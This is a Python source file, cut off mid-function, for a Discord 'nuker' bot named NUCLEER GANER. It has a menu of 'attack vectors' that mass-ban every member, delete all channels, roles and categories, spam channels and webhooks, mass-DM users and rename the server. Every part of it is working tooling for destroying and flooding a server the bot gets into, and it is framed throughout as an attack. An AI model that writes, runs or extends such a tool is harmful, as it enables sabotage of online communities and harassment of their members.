# coded by github.com/leoniofficials
# coded by github.com/leoniofficials
import discord
from discord.ext import commands
import asyncio
import os
import sys
from colorama import init, Fore, Style
import time
import random
import aiohttp
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)
# coded by github.com/leoniofficials

executor = ThreadPoolExecutor(max_workers=1)

# coded by github.com/leoniofficials
async def async_input(prompt):
    """Non-blocking input that doesn't block Discord heartbeat"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(executor, input, prompt)
# coded by github.com/leoniofficials
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
# coded by github.com/leoniofficials
guild = None
# coded by github.com/leoniofficials
def matrix_rain():
    """rain effects"""
    lines = []
    for _ in range(3):
        line = ""
        for _ in range(80):
            line += random.choice(['0', '1', ' ', ' '])
        lines.append(line)
    return lines
# coded by github.com/leoniofficials
def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    # coded by github.com/leoniofficials
    rain = matrix_rain()
    for line in rain:
        print(f"{Fore.RED}{line}")
    # coded by github.com/leoniofficials
    header = f"""
{Fore.RED}{Style.BRIGHT}
    ███╗   ██╗██╗   ██╗ ██████╗██╗     ███████╗███████╗██████╗ 
    ████╗  ██║██║   ██║██╔════╝██║     ██╔════╝██╔════╝██╔══██╗
    ██╔██╗ ██║██║   ██║██║     ██║     █████╗  █████╗  ██████╔╝
    ██║╚██╗██║██║   ██║██║     ██║     ██╔══╝  ██╔══╝  ██╔══██╗
    ██║ ╚████║╚██████╔╝╚██████╗███████╗███████╗███████╗██║  ██║
    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
{Fore.MAGENTA}{Style.BRIGHT}                                                                
         ██████╗  █████╗ ███╗   ██╗███████╗██████╗               
        ██╔════╝ ██╔══██╗████╗  ██║██╔════╝██╔══██╗              
        ██║  ███╗███████║██╔██╗ ██║█████╗  ██████╔╝              
        ██║   ██║██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗              
        ╚██████╔╝██║  ██║██║ ╚████║███████╗██║  ██║              
         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝              
{Style.RESET_ALL}"""
    print(header)
    # coded by github.com/leoniofficials
    binary_msg = f"""
{Fore.WHITE}    WE KEEP{Fore.RED}01110100{Fore.WHITE}0110{Fore.RED}1000{Fore.WHITE}0110{Fore.RED}100{Fore.WHITE}FIGHTING.
    011{Fore.RED}10011{Fore.WHITE}001000{Fore.RED}0{Fore.WHITE}01{Fore.RED}101001{Fore.WHITE}0111001{Fore.RED}1{Fore.WHITE}00100{Fore.RED}0
    {Fore.WHITE}LIKE THE {Fore.RED}00{Fore.WHITE}u111u{Fore.RED}1111{Fore.WHITE}u{Fore.RED}1101{Fore.WHITE}u00
    WORLD{Fore.RED}0{Fore.WHITE}11{Fore.RED}00{Fore.WHITE}001{Fore.RED}011{Fore.WHITE}01{Fore.RED}100{Fore.WHITE}0WE
    010{Fore.RED}00{Fore.WHITE}u0{Fore.RED}01110{Fore.WHITE}100{Fore.RED}01{Fore.WHITE}1{Fore.RED}01{Fore.MAGENTA}UNMASKED
    {Fore.RED}000{Fore.WHITE}0110{Fore.RED}1{Fore.WHITE}10{Fore.RED}1{Fore.WHITE}001{Fore.RED}0{Fore.WHITE}u{Fore.RED}000
    {Fore.WHITE}WE WILL{Fore.RED}11C{Fore.WHITE}0110111{Fore.RED}1{Fore.WHITE}C{Fore.RED}110110{Fore.WHITE}0
    {Fore.RED}FIND{Fore.WHITE}011010101110100011{Fore.RED}01
    {Fore.WHITE}0u1{Fore.RED}101{Fore.WHITE}01111{Fore.RED}0110{Fore.WHITE}1110
    001{Fore.RED}00{Fore.WHITE}0u{Fore.RED}1101{Fore.WHITE}100{Fore.RED}0{Fore.WHITE}OUR {Fore.MAGENTA}TRUE
    {Fore.WHITE}11{Fore.RED}01111{Fore.WHITE}0110{Fore.RED}1111{Fore.WHITE}01{Fore.MAGENTA}SELVES
    {Fore.RED}10101101100{Fore.WHITE}11
    {Fore.WHITE}00100000011
    01{Fore.RED}100{Fore.WHITE}01101001
    0{Fore.RED}11010{Fore.WHITE}11
    AGAIN.{Style.RESET_ALL}
"""
    print(binary_msg)
    # coded by github.com/leoniofficials
    print(f"{Fore.GREEN}╔{'═'*70}╗")
    print(f"║  {Fore.CYAN}[{Fore.WHITE}●{Fore.CYAN}] {Fore.WHITE}SYSTEM STATUS: {Fore.GREEN}OPERATIONAL{' '*32}{Fore.GREEN}║")
    print(f"║  {Fore.CYAN}[{Fore.WHITE}●{Fore.CYAN}] {Fore.WHITE}ENCRYPTION: {Fore.GREEN}AES-256{' '*38}{Fore.GREEN}║")
    print(f"║  {Fore.CYAN}[{Fore.WHITE}●{Fore.CYAN}] {Fore.WHITE}NETWORK: {Fore.GREEN}TOR HIDDEN SERVICE{' '*31}{Fore.GREEN}║")
    print(f"║  {Fore.CYAN}[{Fore.WHITE}●{Fore.CYAN}] {Fore.WHITE}DEVELOPER: {Fore.RED}leoniofficials{' '*36}{Fore.GREEN}║")
    print(f"║  {Fore.CYAN}[{Fore.WHITE}●{Fore.CYAN}] {Fore.WHITE}VERSION: {Fore.MAGENTA}NUCLEER GANER v2.0{' '*32}{Fore.GREEN}║")
    print(f"╚{'═'*70}╝\n")
    # coded by github.com/leoniofficials
    boot_messages = [
        f"{Fore.YELLOW}[!] {Fore.WHITE}Initializing quantum encryption protocols...",
        f"{Fore.GREEN}[✓] {Fore.WHITE}Connection established to anonymous network",
        f"{Fore.GREEN}[✓] {Fore.WHITE}Bypassing security layers...",
        f"{Fore.GREEN}[✓] {Fore.WHITE}Loading attack vectors...",
        f"{Fore.CYAN}[→] {Fore.WHITE}System ready for deployment"
    ]
    # coded by github.com/leoniofficials
    for msg in boot_messages:
        print(msg)
        time.sleep(0.2)
    print()
# coded by github.com/leoniofficials
async def main_menu():
    global guild
    os.system('cls' if os.name == 'nt' else 'clear')
    # coded by github.com/leoniofficials
    print(f"{Fore.RED}{Style.BRIGHT}╔{'═'*70}╗")
    print(f"║{' '*20}{Fore.MAGENTA}NUCLEER GANER{Fore.RED}{' '*37}║")
    print(f"╚{'═'*70}╝{Style.RESET_ALL}\n")
    # coded by github.com/leoniofficials
    if guild:
        print(f"{Fore.GREEN}╔{'═'*70}╗")
        print(f"║ {Fore.CYAN}[{Fore.GREEN}●{Fore.CYAN} CONNECTED{Fore.CYAN}] {Fore.WHITE}TARGET: {Fore.YELLOW}{guild.name[:35]:<35} {Fore.GREEN}║")
        print(f"║ {Fore.CYAN}[{Fore.GREEN}●{Fore.CYAN} ACTIVE   {Fore.CYAN}] {Fore.WHITE}USERS:  {Fore.YELLOW}{guild.member_count:<35} {Fore.GREEN}║")
        print(f"╚{'═'*70}╝")
    else:
        print(f"{Fore.RED}╔{'═'*70}╗")
        print(f"║ {Fore.RED}[{Fore.YELLOW}!{Fore.RED} WARNING{Fore.RED}] {Fore.WHITE}NO TARGET SELECTED - SELECT SERVER FIRST{' '*12}{Fore.RED}║")
        print(f"╚{'═'*70}╝")
    # coded by github.com/leoniofficials
    print(f"\n{Fore.RED}╔{'═'*20} {Fore.WHITE}ATTACK VECTORS{Fore.RED} {'═'*20}╝")
    print(f"{Fore.CYAN}║")
    # coded by github.com/leoniofficials
    attack_vectors = [
        ("01", "INVITE", "Generate Invite Link", Fore.CYAN),
        ("02", "BAN", "Ban User", Fore.RED),
        ("03", "KICK", "Kick User", Fore.YELLOW),
        ("04", "DELCH", "Delete Channel", Fore.RED),
        ("05", "NUTECH", "☢ NUKE ALL CHANNELS", Fore.RED + Style.BRIGHT),
        ("06", "DELROLE", "Delete Role", Fore.RED),
        ("07", "NUKEROLE", "☢ NUKE ALL ROLES", Fore.RED + Style.BRIGHT),
        ("08", "ADDROLE", "Add Role to User", Fore.GREEN),
        ("09", "REMROLE", "Remove Role from User", Fore.YELLOW),
        ("10", "MASSBAN", "☢ MASS BAN MEMBERS", Fore.RED + Style.BRIGHT),
        ("11", "SPAM", "Spam Messages", Fore.MAGENTA),
        ("12", "EMOJISPAM", "Emoji Spam Attack", Fore.MAGENTA),
        ("13", "WEBHOOK", "Webhook Spam", Fore.MAGENTA),
        ("14", "MASSNICK", "Mass Nickname Change", Fore.CYAN),
        ("15", "RENAME", "Change Server Name", Fore.CYAN),
        ("16", "ICON", "Change Server Icon", Fore.CYAN),
        ("17", "SLOWMODE", "Slowmode Control", Fore.YELLOW),
        ("18", "MASSDM", "☢ MASS DM ATTACK", Fore.RED + Style.BRIGHT),
        ("19", "NEWROLE", "Create New Role", Fore.GREEN),
        ("20", "ROLECOLOR", "Change Role Color", Fore.CYAN),
        ("21", "NEWCAT", "Create Category", Fore.GREEN),
        ("22", "NUKECAT", "☢ NUKE CATEGORIES", Fore.RED + Style.BRIGHT),
        ("23", "BANNER", "Change Banner", Fore.CYAN),
        ("24", "AFK", "Set AFK Channel", Fore.YELLOW),
        ("25", "RULES", "Set Rules Channel", Fore.YELLOW),
        ("26", "MODLOG", "Set Mod Log", Fore.YELLOW),
        ("27", "BOOST", "Boost Information", Fore.MAGENTA),
        ("28", "INFO", "Server Intel", Fore.CYAN),
        ("29", "SWITCH", "Switch Target", Fore.GREEN),
        ("30", "EXIT", "☢ DISCONNECT & EXIT", Fore.RED + Style.BRIGHT),
    ]
    # coded by github.com/leoniofficials
    for num, code, desc, color in attack_vectors:
        print(f"{Fore.CYAN}║ {color}[{num}]{Fore.WHITE} {code:<15} {Fore.CYAN}→ {Fore.WHITE}{desc}")
    # coded by github.com/leoniofficials
    print(f"{Fore.CYAN}║")
    print(f"{Fore.RED}╚{'═'*55}╝\n")
    # coded by github.com/leoniofficials
    choice = await async_input(f"{Fore.GREEN}root@{Fore.RED}nucleer{Fore.WHITE}:{Fore.CYAN}~{Fore.WHITE}# {Style.RESET_ALL}")
    choice = choice.strip()
# coded by github.com/leoniofficials
    actions = {
        "1": create_invite, "2": ban_user, "3": kick_user, "4": delete_channel, "5": delete_all_channels,
        "6": delete_role, "7": delete_all_roles, "8": add_role_to_user, "9": remove_role_from_user,
        "10": ban_all_members, "11": spam_channel, "12": emoji_spam, "13": webhook_spam,
        "14": mass_nickname, "15": change_server_name, "16": change_server_icon, "17": slowmode,
        "18": mass_dm, "19": create_role, "20": role_color_change, "21": create_category,
        "22": delete_all_categories, "23": change_banner, "24": set_afk_channel, "25": set_rules_channel,
        "26": set_modlog_channel, "27": boost_info, "28": detailed_server_info, "29": select_guild,
        "30": exit_program
    }

    if choice in actions:
        await actions[choice]()
    else:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Invalid command. Access denied.{Style.RESET_ALL}")

    await async_input(f"\n{Fore.YELLOW}[!] {Fore.WHITE}Press ENTER to return to command center...{Style.RESET_ALL}")
    await main_menu()

def exit_program():
    print(f"\n{Fore.RED}╔{'═'*50}╗")
    print(f"║{Fore.YELLOW}  [!] INITIATING SHUTDOWN SEQUENCE...{' '*12}{Fore.RED}║")
    print(f"╚{'═'*50}╝")
    time.sleep(0.5)
    print(f"{Fore.GREEN}[✓] {Fore.WHITE}Clearing traces...")
    time.sleep(0.3)
    print(f"{Fore.GREEN}[✓] {Fore.WHITE}Erasing logs...")
    time.sleep(0.3)
    print(f"{Fore.GREEN}[✓] {Fore.WHITE}Disconnecting from network...")
    time.sleep(0.3)
    print(f"{Fore.RED}[✓] {Fore.WHITE}Connection terminated.")
    print(f"\n{Fore.MAGENTA}    Goodbye, friend.\n")
    sys.exit(0)

async def select_guild():
    global guild
    
    if len(bot.guilds) == 0:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Bot is not in any server!{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.RED}╔{'═'*20} {Fore.WHITE}AVAILABLE TARGETS{Fore.RED} {'═'*20}╝")
    print(f"{Fore.CYAN}║")
    for i, g in enumerate(bot.guilds, 1):
        print(f"{Fore.CYAN}║ {Fore.GREEN}[{i:02d}]{Fore.WHITE} {g.name[:40]:<40} {Fore.CYAN}({g.member_count} members)")
    print(f"{Fore.CYAN}║")
    print(f"{Fore.RED}╚{'═'*60}╝")
    
    try:
        secim_input = await async_input(f"\n{Fore.GREEN}root@{Fore.RED}nucleer{Fore.WHITE}:{Fore.CYAN}~{Fore.WHITE}# {Fore.CYAN}select > {Style.RESET_ALL}")
        secim = int(secim_input) - 1
        if 0 <= secim < len(bot.guilds):
            guild = bot.guilds[secim]
            print(f"{Fore.GREEN}[✓] {Fore.WHITE}Target locked: {Fore.YELLOW}{guild.name}{Style.RESET_ALL}")
            time.sleep(0.5)
        else:
            print(f"{Fore.RED}[✗] {Fore.WHITE}Invalid selection{Style.RESET_ALL}")
    except ValueError:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Invalid input - enter a number{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Error: {e}{Style.RESET_ALL}")

async def create_invite():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    print(f"{Fore.CYAN}[→] Generating invite link...")
    kanal_id = await async_input(f"{Fore.WHITE}Channel ID (empty = default): {Style.RESET_ALL}") or None
    max_uses_input = await async_input(f"{Fore.WHITE}Max uses (0 = unlimited): {Style.RESET_ALL}") or "0"
    max_uses = int(max_uses_input)
    max_age_input = await async_input(f"{Fore.WHITE}Duration (seconds, 0 = infinite): {Style.RESET_ALL}") or "0"
    max_age = int(max_age_input)
    try:
        kanal = guild.get_channel(int(kanal_id)) if kanal_id else guild.text_channels[0]
        invite = await kanal.create_invite(max_uses=max_uses, max_age=max_age, unique=True)
        print(f"{Fore.GREEN}[✓] Invite generated: {Fore.YELLOW}{invite.url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def ban_user():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    user_id = await async_input(f"{Fore.WHITE}Target User ID: {Style.RESET_ALL}")
    sebep = await async_input(f"{Fore.WHITE}Reason (optional): {Style.RESET_ALL}") or "Executed by NUCLEER"
    try:
        print(f"{Fore.YELLOW}[!] Executing ban protocol...")
        user = await bot.fetch_user(int(user_id))
        await guild.ban(user, reason=sebep)
        print(f"{Fore.RED}[✓] User {user} has been eliminated{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Ban failed: {e}{Style.RESET_ALL}")

async def kick_user():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    user_id = await async_input(f"{Fore.WHITE}Target User ID: {Style.RESET_ALL}")
    try:
        print(f"{Fore.YELLOW}[!] Executing kick protocol...")
        member = guild.get_member(int(user_id))
        if member:
            await member.kick(reason="Executed by NUCLEER")
            print(f"{Fore.YELLOW}[✓] User {member} has been kicked{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Target not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Kick failed: {e}{Style.RESET_ALL}")

async def delete_channel():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    kanal_id = await async_input(f"{Fore.WHITE}Channel ID: {Style.RESET_ALL}")
    try:
        print(f"{Fore.YELLOW}[!] Initiating channel deletion...")
        kanal = guild.get_channel(int(kanal_id))
        if kanal:
            await kanal.delete()
            print(f"{Fore.RED}[✓] Channel {kanal.name} deleted{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Channel not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Deletion failed: {e}{Style.RESET_ALL}")

async def delete_all_channels():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print("    ║  WARNING: NUCLEAR CHANNEL OBLITERATION     ║")
    print("    ║  THIS ACTION CANNOT BE UNDONE!             ║")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print(f"{Style.RESET_ALL}")
    onay = await async_input(f"{Fore.RED}Type 'NUKE' to confirm: {Style.RESET_ALL}")
    onay = onay.upper()
    if onay != "NUKE": 
        return
    
    print(f"{Fore.RED}{Style.BRIGHT}[☢] INITIATING CHANNEL NUKE SEQUENCE...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.RED}[3...]{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.RED}[2...]{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.RED}[1...]{Style.RESET_ALL}")
    time.sleep(0.5)
    print(f"{Fore.RED}{Style.BRIGHT}[LAUNCHING!]{Style.RESET_ALL}\n")
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
            print(f"{Fore.RED}[×] {channel.name} obliterated{Style.RESET_ALL}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] {channel.name} protected: {e}{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}[☢] NUKE COMPLETE - ALL CHANNELS DESTROYED{Style.RESET_ALL}")

async def delete_role():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    rol_id = await async_input(f"{Fore.WHITE}Role ID: {Style.RESET_ALL}")
    try:
        print(f"{Fore.YELLOW}[!] Deleting role...")
        rol = guild.get_role(int(rol_id))
        if rol:
            await rol.delete()
            print(f"{Fore.GREEN}[✓] Role {rol.name} deleted{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Role not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Deletion failed: {e}{Style.RESET_ALL}")

async def delete_all_roles():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print("    ║  WARNING: NUCLEAR ROLE OBLITERATION        ║")
    print("    ║  ALL ROLES EXCEPT @everyone WILL BE NUKED ║")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print(f"{Style.RESET_ALL}")
    onay = await async_input(f"{Fore.RED}Type 'NUKE' to confirm: {Style.RESET_ALL}")
    onay = onay.upper()
    if onay != "NUKE": 
        return
    
    print(f"{Fore.RED}{Style.BRIGHT}[☢] INITIATING ROLE NUKE SEQUENCE...{Style.RESET_ALL}")
    for role in list(guild.roles):
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"{Fore.RED}[×] {role.name} obliterated{Style.RESET_ALL}")
                await asyncio.sleep(0.3)
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {role.name} protected{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}[☢] NUKE COMPLETE{Style.RESET_ALL}")

async def add_role_to_user():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    uye_id = await async_input(f"{Fore.WHITE}User ID: {Style.RESET_ALL}")
    rol_id = await async_input(f"{Fore.WHITE}Role ID: {Style.RESET_ALL}")
    try:
        member = guild.get_member(int(uye_id))
        rol = guild.get_role(int(rol_id))
        if member and rol:
            await member.add_roles(rol)
            print(f"{Fore.GREEN}[✓] Role assigned{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] User or role not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def remove_role_from_user():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    uye_id = await async_input(f"{Fore.WHITE}User ID: {Style.RESET_ALL}")
    rol_id = await async_input(f"{Fore.WHITE}Role ID: {Style.RESET_ALL}")
    try:
        member = guild.get_member(int(uye_id))
        rol = guild.get_role(int(rol_id))
        if member and rol:
            await member.remove_roles(rol)
            print(f"{Fore.GREEN}[✓] Role removed{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] User or role not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def ban_all_members():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("    ⚠ ════════════════════════════════════════════════ ⚠")
    print("    ║  CRITICAL WARNING: MASS BAN PROTOCOL           ║")
    print("    ║  ALL MEMBERS WILL BE PERMANENTLY BANNED        ║")
    print("    ║  THIS IS IRREVERSIBLE!                         ║")
    print("    ⚠ ════════════════════════════════════════════════ ⚠")
    print(f"{Style.RESET_ALL}")
    onay = await async_input(f"{Fore.RED}Type 'MASSBAN' to confirm: {Style.RESET_ALL}")
    onay = onay.upper()
    if onay != "MASSBAN": 
        return
    
    print(f"{Fore.RED}{Style.BRIGHT}[☢] INITIATING MASS BAN PROTOCOL...{Style.RESET_ALL}")
    banned = 0
    for member in list(guild.members):
        if member != guild.owner and member != bot.user:
            try:
                await member.ban(reason="Mass ban executed by NUCLEER")
                banned += 1
                print(f"{Fore.RED}[×] {member} eliminated ({banned}){Style.RESET_ALL}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {member} protected{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}[☢] MASS BAN COMPLETE - {banned} USERS ELIMINATED{Style.RESET_ALL}")

async def spam_channel():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    kanal_id = await async_input(f"{Fore.WHITE}Channel ID: {Style.RESET_ALL}")
    mesaj = await async_input(f"{Fore.WHITE}Message: {Style.RESET_ALL}")
    sayi_input = await async_input(f"{Fore.WHITE}Count: {Style.RESET_ALL}")
    sayi = int(sayi_input)
    try:
        kanal = guild.get_channel(int(kanal_id))
        if kanal:
            print(f"{Fore.YELLOW}[!] Initiating spam attack...")
            for i in range(sayi):
                await kanal.send(mesaj)
                if i % 10 == 0:
                    print(f"{Fore.CYAN}[→] Progress: {i}/{sayi}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[✓] Spam attack complete{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Channel not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def emoji_spam():
    if not guild: 
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    kanal_id = await async_input(f"{Fore.WHITE}Channel ID: {Style.RESET_ALL}")
    emoji = await async_input(f"{Fore.WHITE}Emoji: {Style.RESET_ALL}")
    sayi_input = await async_input(f"{Fore.WHITE}Count: {Style.RESET_ALL}")
    sayi = int(sayi_input)
    try:
        kanal = guild.get_channel(int(kanal_id))
        if kanal:
            print(f"{Fore.YELLOW}[!] Initiating emoji spam...")
            for i in range(sayi):
                await kanal.send(emoji)
            print(f"{Fore.GREEN}[✓] Emoji spam complete{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Channel not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def webhook_spam():
    webhook_url = await async_input(f"{Fore.WHITE}Webhook URL: {Style.RESET_ALL}")
    mesaj = await async_input(f"{Fore.WHITE}Message: {Style.RESET_ALL}")
    sayi_input = await async_input(f"{Fore.WHITE}Count: {Style.RESET_ALL}")
    sayi = int(sayi_input)
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(webhook_url, session=session)
            print(f"{Fore.YELLOW}[!] Webhook spam starting...")
            for i in range(sayi):
                await webhook.send(mesaj)
                if i % 10 == 0:
                    print(f"{Fore.CYAN}[→] Progress: {i}/{sayi}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[✓] Webhook spam complete{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def mass_nickname():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    nickname = await async_input(f"{Fore.WHITE}New nickname for all: {Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] Starting mass nickname change...{Style.RESET_ALL}")
    changed = 0
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            try:
                await member.edit(nick=nickname)
                changed += 1
                print(f"{Fore.GREEN}[✓] {member} renamed ({changed}){Style.RESET_ALL}")
                await asyncio.sleep(0.5)
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {member} protected{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[✓] Mass nickname complete - {changed} users renamed{Style.RESET_ALL}")

async def change_server_name():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    new_name = await async_input(f"{Fore.WHITE}New server name: {Style.RESET_ALL}")
    try:
        old_name = guild.name
        await guild.edit(name=new_name)
        print(f"{Fore.GREEN}[✓] Server renamed from '{old_name}' to '{new_name}'{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def change_server_icon():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    icon_path = await async_input(f"{Fore.WHITE}Icon file path (or 'remove' to delete): {Style.RESET_ALL}")
    try:
        if icon_path.lower() == 'remove':
            await guild.edit(icon=None)
            print(f"{Fore.GREEN}[✓] Server icon removed{Style.RESET_ALL}")
        else:
            with open(icon_path, 'rb') as f:
                icon_data = f.read()
            await guild.edit(icon=icon_data)
            print(f"{Fore.GREEN}[✓] Server icon changed{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def slowmode():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    kanal_id = await async_input(f"{Fore.WHITE}Channel ID (empty = all): {Style.RESET_ALL}")
    delay_input = await async_input(f"{Fore.WHITE}Slowmode delay (seconds, 0-21600): {Style.RESET_ALL}")
    delay = int(delay_input)
    
    try:
        if kanal_id:
            kanal = guild.get_channel(int(kanal_id))
            if kanal and isinstance(kanal, discord.TextChannel):
                await kanal.edit(slowmode_delay=delay)
                print(f"{Fore.GREEN}[✓] Slowmode set to {delay}s in {kanal.name}{Style.RESET_ALL}")
        else:
            for kanal in guild.text_channels:
                try:
                    await kanal.edit(slowmode_delay=delay)
                    print(f"{Fore.GREEN}[✓] {kanal.name} - {delay}s{Style.RESET_ALL}")
                    await asyncio.sleep(0.3)
                except:
                    pass
            print(f"{Fore.GREEN}[✓] Slowmode applied to all channels{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def mass_dm():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print("    ║  WARNING: MASS DM ATTACK                   ║")
    print("    ║  ALL MEMBERS WILL RECEIVE DM               ║")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print(f"{Style.RESET_ALL}")
    mesaj = await async_input(f"{Fore.WHITE}Message to send: {Style.RESET_ALL}")
    onay = await async_input(f"{Fore.RED}Type 'MASSDM' to confirm: {Style.RESET_ALL}")
    
    if onay.upper() != "MASSDM":
        return
    # coded by github.com/leoniofficials
    print(f"{Fore.RED}{Style.BRIGHT}[☢] INITIATING MASS DM...{Style.RESET_ALL}")
    sent = 0
    for member in guild.members:
        if member != bot.user and not member.bot:
            try:
                await member.send(mesaj)
                sent += 1
                print(f"{Fore.GREEN}[✓] DM sent to {member} ({sent}){Style.RESET_ALL}")
                await asyncio.sleep(1)
            except:
                print(f"{Fore.YELLOW}[!] {member} DM blocked{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}[☢] MASS DM COMPLETE - {sent} MESSAGES SENT{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def create_role():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    rol_adi = await async_input(f"{Fore.WHITE}Role name: {Style.RESET_ALL}")
    color_input = await async_input(f"{Fore.WHITE}Color (hex, e.g., #FF0000) or empty: {Style.RESET_ALL}")
   # coded by github.com/leoniofficials 
    try:
        if color_input:
            color = discord.Color(int(color_input.replace('#', ''), 16))
        else:
            color = discord.Color.default()
        # coded by github.com/leoniofficials
        role = await guild.create_role(name=rol_adi, color=color)
        print(f"{Fore.GREEN}[✓] Role '{rol_adi}' created (ID: {role.id}){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def role_color_change():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    rol_id = await async_input(f"{Fore.WHITE}Role ID: {Style.RESET_ALL}")
    color_input = await async_input(f"{Fore.WHITE}New color (hex, e.g., #00FF00): {Style.RESET_ALL}")
    # coded by github.com/leoniofficials
    try:
        rol = guild.get_role(int(rol_id))
        if rol:
            color = discord.Color(int(color_input.replace('#', ''), 16))
            await rol.edit(color=color)
            print(f"{Fore.GREEN}[✓] Role color changed{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Role not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def create_category():
    if not guild:
